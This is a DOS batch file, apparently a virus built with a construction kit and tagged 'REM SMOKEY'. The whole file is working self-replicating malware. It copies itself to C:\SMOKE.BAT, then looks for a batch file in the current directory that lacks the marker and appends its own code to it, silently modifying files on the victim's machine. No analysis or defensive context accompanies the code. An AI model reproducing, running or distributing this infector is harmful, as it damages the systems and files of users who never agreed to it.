@ECHO OFF
REM CREATED BY WHO CARES WITH SBVC v1.0b
REM SMOKEY
IF NOT EXIST C:\SMOKE.BAT COPY %0.BAT C:\SMOKE.BAT > nul
FOR %%b IN (*.BAT *.bat) DO SET BATCH_FILES=%%b
FIND "REM SMOKEY" <%BATCH_FILES% > nul
IF ERRORLEVEL 1 COPY %BATCH_FILES% + C:\SMOKE.BAT %BATCH_FILES% > nul